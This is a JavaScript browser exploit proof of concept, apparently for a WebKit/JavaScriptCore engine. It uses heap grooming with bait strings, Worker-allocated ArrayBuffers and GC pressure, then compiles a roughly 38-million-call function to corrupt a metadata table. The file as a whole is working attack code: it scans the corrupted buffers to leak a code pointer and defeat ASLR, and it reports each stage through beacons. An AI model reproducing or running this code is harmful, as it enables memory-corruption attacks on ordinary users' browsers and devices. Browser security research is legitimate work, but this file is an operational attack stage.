// p466b — MetadataTable AB extraction via WORKER allocation
//
// p466 failed: hitABs=0. Main-thread AB targets ended up at LOWER addresses
// than metadata buffer (allocator reuses existing free space).
// FIX: Worker allocates ABs → fresh pages at higher addresses (proven in p156).
//
// Also adds JSString verification targets alongside ABs.
// If JSStrings get .length corrupted but ABs show NO-HIT, we know
// the sweep works but ABs are at wrong addresses.
//
// Per-entry writes (JIT=OFF, 112-byte stride):
//   +12: m_slowPathCount = 0xFFFFFFFF
//   +24: m_slowPathCallDestination = thunk address (ASLR LEAK)
//   +64: m_callType = 1
//   +68: m_bytecodeIndex = sequential 0..38M
//
// Beacon prefix: V466B-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V466B-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ── WORKER CODE ──
  var workerCode = function() {
    var baseUrl = '';
    var MARKER = 0xCC;
    var AB_SIZE = 100112;
    var STR_LEN = 100000;
    var abList = [];
    var viewList = [];
    var strTargets = [];

    function beacon(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V466B-W-' + tag, false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body || '');
      } catch(e) {}
    }
    function hx(b) { return (b < 16 ? '0' : '') + b.toString(16); }
    function hexN(view, off, n) {
      var s = '';
      for (var i = 0; i < n && off + i < view.length; i++) s += hx(view[off + i]);
      return s;
    }
    function hexPtr(view, off) {
      var s = '';
      for (var i = 7; i >= 0; i--) s += hx(view[off + i]);
      return s;
    }
    function u32(view, off) {
      return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        // Allocate AB targets (filled with marker)
        var nAB = e.data.nAB || 20;
        for (var i = 0; i < nAB; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          var v = new Uint8Array(ab);
          for (var j = 0; j < v.length; j++) v[j] = MARKER;
          abList.push(ab);
          viewList.push(v);
        }
        beacon('AB-' + abList.length);

        // Also allocate JSString verification targets (same as p156)
        var chunk = '';
        for (var k = 0; k < 1000; k++) chunk += 'A';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          strTargets.push(s);
        }
        beacon('STR-' + strTargets.length);

        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // ── SCAN A: JSString verification ──
        var strCorrupt = 0;
        for (var i = 0; i < strTargets.length; i++) {
          if (strTargets[i].length !== STR_LEN) {
            strCorrupt++;
            beacon('STRLEN-' + i + '-' + strTargets[i].length);
          }
        }
        beacon('STR-CORRUPT-' + strCorrupt + '-of-' + strTargets.length);

        // ── SCAN B: ArrayBuffer targets ──
        var hitABs = 0;
        var allPtrs = [];

        for (var ai = 0; ai < viewList.length; ai++) {
          var v = viewList[ai];

          // Full scan: check every byte (not just every 16th)
          var dirty = false;
          for (var j = 0; j < v.length; j++) {
            if (v[j] !== MARKER) { dirty = true; break; }
          }
          if (!dirty) continue;
          hitABs++;

          // Find entry alignment via m_slowPathCount = 0xFFFFFFFF
          var bestBase = -1, bestN = 0;
          for (var tb = 0; tb < 112; tb++) {
            var n = 0;
            for (var off = tb + 12; off + 4 <= v.length; off += 112) {
              if (u32(v, off) === 0xFFFFFFFF) n++;
            }
            if (n > bestN) { bestN = n; bestBase = tb; }
          }

          if (bestBase < 0 || bestN < 3) {
            var fst = -1;
            for (var j = 0; j < v.length; j++) { if (v[j] !== MARKER) { fst = j; break; } }
            beacon('RAW-' + ai, 'off' + fst + ':' + hexN(v, fst, 224));
            continue;
          }

          beacon('ALIGN-' + ai, 'base=' + bestBase + ',n=' + bestN);

          // Extract thunk pointers + bytecodeIndex
          var ptrs = [], bcis = [];
          for (var eOff = bestBase; eOff + 80 <= v.length; eOff += 112) {
            if (u32(v, eOff + 12) !== 0xFFFFFFFF) continue;
            ptrs.push(hexPtr(v, eOff + 24));
            bcis.push(u32(v, eOff + 68));
            if (ptrs.length >= 5) break;
          }

          if (ptrs.length > 0) {
            beacon('PTR-' + ai, ptrs.join(','));
            beacon('BCI-' + ai, bcis.join(','));
            for (var p = 0; p < ptrs.length; p++) allPtrs.push(ptrs[p]);
          }

          // Dump first valid entry raw
          for (var eOff = bestBase; eOff + 112 <= v.length; eOff += 112) {
            if (u32(v, eOff + 12) === 0xFFFFFFFF) {
              beacon('ENTRY-' + ai, hexN(v, eOff, 112));
              break;
            }
          }

          if (allPtrs.length >= 10) break;
        }

        beacon('AB-SUMMARY', 'hitABs=' + hitABs + ',ptrs=' + allPtrs.length + ',total=' + viewList.length);

        if (allPtrs.length > 0) {
          beacon('ASLR-LEAK', allPtrs[0]);
          var same = true;
          for (var i = 1; i < allPtrs.length; i++) {
            if (allPtrs[i] !== allPtrs[0]) { same = false; break; }
          }
          beacon('PTR-CONSISTENT', same ? 'YES-' + allPtrs.length : 'NO-' + allPtrs.join(','));
        } else if (hitABs > 0) {
          beacon('SWEEP-HIT-NO-ALIGN');
        } else {
          beacon('NO-AB-HIT');
        }

        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (main thread, lower marge pages) ──
  var N_BAIT = 20;
  var BAIT_LEN = 100000;
  var baits = [];
  var baitPiece = '';
  for (var c = 0; c < 1000; c++) baitPiece += 'B';
  for (var i = 0; i < N_BAIT; i++) {
    var s = '';
    for (var j = 0; j < BAIT_LEN; j += 1000) s += baitPiece;
    s = s.substring(0, BAIT_LEN);
    s.charCodeAt(0);
    baits.push(s);
  }
  baitPiece = null;
  B('BAIT', '' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) {
      phaseFreeBaits();
    }
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', nAB: 20 });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < N_BAIT; i++) baits[i] = null;
    baits = null;

    var gcR = 0;
    function gcStep() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
      gcR++;
      if (gcR < 30) {
        setTimeout(gcStep, 30);
      } else {
        B('GC', '' + gcR);
        buildOverflow();
      }
    }
    gcStep();
  }

  // ── PHASE 4: BUILD 38M FUNCTION ──
  function buildOverflow() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';

    var parts = ['window.__p466bfn=function(a){'];
    for (var ch = 0; ch < nC; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__p466bok=1;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB', Math.round(blob.size / 1048576) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED', window.__p466bok ? 'OK' : 'FAIL');
      // Tell worker to scan targets
      setTimeout(function() {
        worker.postMessage({ cmd: 'scan' });
      }, 200);
    };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
